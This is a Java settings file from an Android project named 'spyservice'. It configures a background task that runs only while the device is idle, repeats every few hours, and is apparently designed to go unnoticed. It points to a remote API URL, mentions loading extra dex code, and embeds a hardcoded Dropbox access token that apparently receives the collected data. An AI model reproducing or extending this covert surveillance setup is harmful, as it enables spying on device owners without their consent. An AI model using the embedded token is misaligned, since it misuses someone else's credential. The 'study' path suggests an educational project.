/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 + Copyright (C) 2020 Eldar Timraleev (aka CRaFT4ik). All rights reserved.                        +
 + Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file      +
 + except in compliance with the License. You may obtain a copy of the License at                 +
 + http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in   +
 + writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT    +
 + WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the       +
 + specific language governing permissions and limitations under the License.                     +
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

package ru.er_log.spyservice;

import java.util.concurrent.TimeUnit;

public class Settings
{
    public static final boolean     RUN_IN_BACKGROUND   = true;                 // Enable WorkManager service (= true) or debug program in direct mode (= false). For release should be true.
    public static final boolean     USE_LOCAL_DEX       = false;                // If true, you need to include 'loadabledex' module to 'app' project dependencies and uncomment line in 'Worker' class. For release should be false.
    public static final String      LOG_TAG             = "CR_TAG";
    public static final String      API_URL             = "http://www.er-log.ru/study/spyservice/";

    // Task.

    public static final String      TASK_TAG            = "CR_TASK";
    public static final boolean     REQUIRES_IDLE       = true;                 // If true, task will execute only if device idle now. Recommended value is true.
    public static final int         INITIAL_DELAY       = 20;                   // Recommended value is 1 hour.
    public static final TimeUnit    INITIAL_TIME_UNIT   = TimeUnit.MINUTES;
    public static final int         REPEAT_INTERVAL     = 8;                    // Recommended value is 12 hours.
    public static final TimeUnit    REPEAT_TIME_UNIT    = TimeUnit.HOURS;
    public static final int         FLEX_INTERVAL       = 3;                    // Recommended value is 4 hours.
    public static final TimeUnit    FLEX_TIME_UNIT      = TimeUnit.HOURS;

    // DropBox.

    public static final String      ACCESS_TOKEN        = "OfRRSa5YovwAAAAAAAAAHUoANpkCJ_BZVA_t782wIQrrUga4soCzhRktH4PUd4Sl";
//    public static final String      APP_KEY             = "";
//    public static final String      APP_SECRET          = "";
}
